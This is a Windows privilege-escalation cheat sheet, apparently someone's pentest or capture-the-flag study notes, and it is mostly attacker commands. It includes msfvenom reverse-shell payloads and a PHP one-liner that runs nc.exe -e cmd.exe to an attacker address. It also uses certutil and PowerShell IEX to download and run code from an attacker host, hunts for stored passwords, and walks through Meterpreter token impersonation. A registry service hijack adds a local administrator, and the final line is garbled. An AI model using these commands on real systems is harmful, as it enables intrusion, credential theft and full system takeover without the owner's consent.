# Windows-Privesc

# Terms:
```
IIS - Internet Information Services, is an extensible web server software created by Microsoft for use with the Windows NT family. Its supports HTTP, HTTP/2, HTTPS, FTP, FTPS, SMTP and NNTP. 

DLL - Dynamic-link library is Microsoft's implementation of the shared library concept in the Microsoft Windows and OS/2 operating systems. These libraries usually have the file extension DLL, OCX (for libraris containing ActiveX controls), or DRV (for legacy system drivers). The file formats for DLLs are the same as for Windows EXE files - that is, Portable Executable (PE) for 32-bit and 64-bit Windows, and New Executable (NE) for 16-bit Windows. As with EXEs, DLLs can contain coded, data and resources, in any combination.

Meterpreter - Meterpreter is a Metaploit attack payload that provides an interactive shell from which an attacker can explore the target machine and execute code.
Meterpeter is deployed using in-memory DLL injection. As a result, Meterpeter resides entirely in memory and writes nothing to disk.

Token Impersonation - Tokens are temporary keys that allow you access to a system/network without having to provide credentials each time you access a file (like cookies for computers).
There are two types of tokens:
* Delegate - Created for logging into a machine or using Remote Desktop.
* Impersonate - "non-interactive" such as attaching a network drive or a domain logon script.

Potato Attacks - In potato attacks we are tricking the "NT AUTHORITY\SYSTEM" account into authenticating via NTLM to a TCP endpoint we control.
We use the MIM (Man-in-the-middle) technique to attempt (NTLM relay) to locally negotiate a security token for the "NT AUTHORITY\SYSTEM" account. This is done through a series of windows API calls.
Impersonate the token we have just negotiated. This can only be done if the attackers current account has the privilege to impersonate security tokens. This is usually true of most service accounts and not true of most user-level accounts.

Alternate data streams - ADS are a file attribute only found on the NTFS file system.
In this system a file is build u from a couple of attributes, one of them is $Data, aka the data attribute.
https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/
```
# Basic commands:
```
whoami - command to see corrent user.
---
dir - command to list all files and directories that exist.
---
sysinfo - command to see system info.
---
shell - command to get shell.
---
findstr - command to grep specific thing that you want.
---
hostname - command to get hostname.
---
wmic qfe - command to extract patching.
---
wmic logicaldisk - to get the list of drives.
---
net user - command to get the users that exist.
---
net localgroup - command to get the localgroups that exit on the system.
---
netstat - command to get the ports.
---
sc - command to use service control.
---
certutil - command like wget.
---
cd /users/administrator - command to get to administrator directory.
---
where /R (recursive) c:\windows - command that we can use to find a file on disk c in the windows directory.
---
type - command to list a content of a file.
---
dir /R - command simillar to ls -arl in linux.
---
more < $filename - command to get content of hidden files.
---
cmdkey /list --- command to look for stored credentials on the machine.
---
readpst - command to read pst files.
---
icacls - This command enables a user to view and modify an ACL. This command is similar to the cacls command available in previous versions of Windows(e.x icacls c:\users\public\desktop).
---
```
## Reverse shell using FTP/SMB and meterpreter
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=X -f (file type) -o (file name)
---
After we see that we get a shell we can go to msfconsole and write use exploite/multi/handler.
When we are in the exploit we need to set the payload with the next command ---> set payload windows/meterpeter/reverse_tcp (the payload is the same as we used earlier.
After we can write options and see that the payload is set and we can see that there is a LHOST LPORT that we need to set the same as we did in the payload.
Payload for LHOST ---> set lhost $IP
Payload for LPORT ---> set lport $port
After we've set all the things that we need we can use the command run.

Then we need to go the the ftp server and upload our file and execute it.
```
# System Enumeration
```
First lets use the command systeminfo.
---
For example we can use systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" to get specific things that we want.
---
We can see how many drives are the in the system by using the command wmic logicaldisk.
```
# User Enumeration
```
First we want to see what user we got so lets use the command ---> whoami.

To see what privileges we got we can use the command ---> whoami /priv.

To see what groups we are involved in we can use the command ---> whoami /groups.

To see what users are on the machine we can use the command ---> net user (to get information about the users that we see we can add the user name to the command).

To see what localgroup exists we can use the command ---> net localgroup (we can add administrator to the command to see what users are in the administrator group or we can add any existing group to enumerate our way to users in a specific group).

```
# Network Enumeration
```
First lets use the command ---> ipconfig to get the basic information about the network ( we can add /all to see more information).

We can look at a arp table with using the command arp -a.

We can look at the routing table with using the command ---> route print.

We can see the ports that are out there by using the command ---> netstat -ano
```
# Password Hunting in cleartext
```
We can use the command findstr /si password *.txt *.ini *.config
findstr /spin "password" *.*
dir /s *pass* == *cred* == *vnc* == *.config* 
```
#  AV and Firewall Enumeration
```
We can use the command ---> sc query windefend (to see information about windows defender).

To see all of the services that are running on the machine we can use the command ---> sc queryex type= service.

To see the firewalls that are up we can use the command ---> nets advfirewall firewall dump / netsh firewall show state / netsh firewall show config.
```
# Automated Tools
```
Executables
---
winPEAS.exe
Seatbelt.exe (need to compile)
Watson.exe (need to compile) (looks for common vulnerabilites)
SharpUp.exe (need to compile)
---
PowerShell
---
Sherlock.ps1 (looks for common vulnerabilites)
PowerUp.ps1
jaws-enum.ps1
---
Other
---
windows-exploit-suggester.py (local on attack machine)
Exploit suggester (Metasploit)
```
# Local_exploit_suggester
```
We can scan for kernel exploits with the next command on the meterpreter:
run post/multi/recon/local_exploit_suggester
---
After we can we find some exploits we can use the command ---> background.
After we used the command we need to run the exploit that we want to abuse with the next command ---> usr exploit/windows/local/****exploit****

Now we need to set out session to the seesion that we got from the background command with the command ---> set session ?.

We need to set out lhost and lport (we need to use a different port from which we used in the reverse shell).

Then we can use run
```
# Windows manual Escalation
```
First we need to see if we can upload a file to a ftp server or something like that...
Lets say that we can so we can use meterpreter with the next command:
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=x -f (file extension) > (file name)
We need to upload the file to the place that it can be uploaded to.

Then we can run the command ---> nc -lvnp $PORT

We will get a connection without using meterpreter.

Now lets get systeminfo and lets find an exploit for the kernel version.

we found our kernel exploit lets find a writtable place and upload it to the windows shell with the next command:

certutil -urlcache -f http://X.X.X.X/file_name file_name(on the windows machine)
```
# Reverse shell using FTP/SMB and php
```
First we need to locate out nc.exe and upload it to the FTP/SMB server.
After we uploaded the nc.exe we need to create our reverse_shell.php file, we can use the next command:
---<?php system('nc.exe -e cmd.exe x.x.x.x $PORT')?>---
After we've uploaded the file we can execute it and get a reverse shell.
```
# Windows Subsystem for Linux (WSL)
```
First we need to look for a file named bash.exe/ wsl.exe.
We can use the command ---> where /R (recursive) c:\windows (any directory we think it my be in) bash.exe/ wsl.exe.
Now we need to execute the file that we've found.
[Another way we can abuse the wsl.exe/ bash.exe files is using commands with them for example:
1. wsl whoami
2. wsl python -c 'Python_Reverse_Shell']
When we've executed the file we will get a Linux shell.
Now we can use Linux basic enumeration techniques to try and find a way to get a higher privilege user (We can look at history, sudo -l, etc...).
Lets take a case when we found an administrator user and the password for that user now we can use psexec.py to connect to the machine.
The basic command is ---> python3 psexec.py HOSTNAME/username:'password'@$IP. (note: if psexec.py doesn't work we can use smbexec.py or wmiexe.py).
```
# Impersonation and Potato Attacks
```
When we get a shell on a machine we can use the command ---> whoami /priv and see our privileges information, we need to look for SeImpersonatePrivilege if we have it Enabled we can abuse it.
If we got a meterpreter shell we can use the command ---> getprivs and look for the SeImpersonatePrivilege.
We can get information about what all privileges are able to do in the next page ---> https://github.com/gtworek/Priv2Admin.
For information about potato attacks we can go to this site ---> https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/.
```
# Meterpreter potato attack
```
We will go on our meterpreter shell and we will use a exploit ---> use exploit/multi/script/web_delivery.
We will go to options and will set the relevant thing that we need for example:
LHOST, LPORT, SRVHOST, targets (most cases we will use PSH (powershell)).
We need to set our payload to windows/meterpreter/reverse_tcp (if we dont use python).
Lets say we use the psh after we will use the command ---> run, we should get a ps command to copy to our windows shell that we got earlier and we will get a shell (it will show the session that we got our shell on).
We can use the command ---> run post/multi/recon/local_exploit_suggester (to get the exploits path on meterpreter).
Now in our case we want to use potato attack we will need to set the exploit. lets say we have the ms16_075_reflection exploit,
We will use the command ---> use exploit windows/local/ms16_075_reflection (exploit name). 
After we will use the exploit we will need to set out our options to the relevent once we will need to set the port for a new one and we will need to set our payload to ---> windows/x64/meterpreter/reverse_tcp.
After we will get the shell we will use the command ---> load incognito (to load incognito extention).
After we will use list_tokens -u (on the meterpreter shell).
We will get some tokens that we can impersonate with the command ---> impersonate_token "Token_name" (e.x NT AUTHORITY\SYSTEM).
```
# getsystem
```
Meterpreter ONLY!!!!
We can use this command to get authority\system on a box.
in this command we got 3 technique's:
1. It creates a named pipe from meterpreter and runs a service that runs cmd.exe /c echo "some data" > \\.\pipe[random pipe here]. after the cmd.exe connects to the meterpreter's naamed pipe the meterpreter has the opportunity to impersonate that security context.
2. Is like technique 1. It creates a name pipe and impersonates the security context of the first client to connect to it. To create a client with the SYSTEM user context this technique drops aDLL to disk and schedules rundll32.exe as a service to run the DLL as SYSTEM.  (no recomended to use because it can get cought by AV).
3. This technique is aa little different, It assumes you have SeDebugPrivileges (whoami /priv). It loops through all open services to find one that is running as SYSTEM and that you have premissions to inject into. It uses reflective DLL injection to run its elevator.dll in the memory space of the service it finds. 
https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/
```
# Runas command
```
This command allows us to run commands as somebody else.
We can use this command only if we have stored keys on cmdkey /list command.
example runas /user:ACCESS\Administrator /savecred "powershell -c IEX (New-Object net.webclient).downloadstring('http://IP/FILENAME.ps1')" (the file will have a reverse shell/ other things that we want to abuse).
```
# PowerUp
```
PowerUp is the result of wanting a clean way to audit client systems for common Windows privilege escalation vectors. It utilizes varios service abuse checks, .dll hijacking opportunities, registry checks, and more to enumerate common ways that you might be able to elevate on a target system.
We will use the command PowerUp.ps1 power -ep bypass.
Lets take an example that we have the option AlwaysInstallElevated and the abusefunction: write-useraddMSI.
So we will do the command ---> Write-UserAddMSI (in the powerup path).
It will install a melicious msi file that we could elevate to higher privileged.
We will run the program that we've created that has admin priv and get a user added to administrator localgroup (in our case).
```
# Registry Escalation with Autorun
```
Autorun is when we have a program that is set to autorun (we dont need any interaction to make it run e.x someone loging on will make the autorun program.exe to run).
We can use a tool named ---> Autroruns64.exe to see what is autorunning.
We can use a tool named accesschk64.exe with the flags -#w#(only show files with write)#v#(verbose)#u#(ignore errors) and the path to the file that we want to check the access (e.x Accesschk64.exe -wvu "c:\program files\autorun program".
After we will run the tool we will look for an option named RW everyone and FILE_ALL_ACCESS that means that we can make someone else to run this file and get a revshell on the user that has run this program.exe.
Lets say the we can RW on the path that the program.exe is on, we can create a malicious file that has a reverse shell to our session, and replace it with the existing file that is on there.
We will make our own file and open a listener on nc/ meterpreter and we will wait until it will trigger the file.
```
# Registry Escalaation with AlwaysInstallElevated
```
We can use the AlwaysInstallElevated policy to install a Windows Installer package with elevated (system) privileges.
This option is equivalent to granting full administrative rights, which can pose a massive security risk. Microsoft strongly discourages the use of this setting.
To see if we have premission to do so we can use the command ---> reg query HKLM\Software\Policies\Microsoft\Windows\Installer if it says 0x1 that means that we got the premissoin to do so.
We also need to run ---> reg query HKCU\Software\Policies\Microsoft\Windows\Installer we need to have 0x1 on that too for us to have premission to install windows packages with elevated privileges.
WE NEED BOTH TO HAVE 0x1 for that to work.
```
# Service Escalation Registry
```
First we will need to detect the escalation path.
Lets write the command on PowerShell(must) ---> Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
If we see that the user belongs to "NT AUTHORITY\INTERACTIVE" has "FullControl" premission over the registry key, then we can escalate.
So lets copy a file named windows_service.c (tool that we need to download).
After we got the tool on our machine we can replace the command used by the system() function to the command ---> cmd.exe /k net localgroup administrators user /add.
After we got it we need to complie the file by typing the following command ---> x86_64-w64-mingw32-gcc windows_service.c -o x.exe.
And then we need to copy the file to our vulnerable machine.
We will place the file to the c:\TEMP folder and will write the next command ---> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f (flags: /v (we will tell what registry we want to add the file to) (ImagePath is an image key that contains the path of the driver image file and when we will run the command sc start regsvc we will execute the x.exe file that we've created and added to the registry). /t (type) /d (data, path to the file that we want to execute). /f (dont tell me anything that is going on).
Then lets run the command sc start regsvc.
After we will run the command we will se the the user that we wanted to add is in the administrators group ---> net localgroup adminstrators.
``` 
# rdesktop connection 
```
rdesktop $IP -g 95% ais an image eky
```
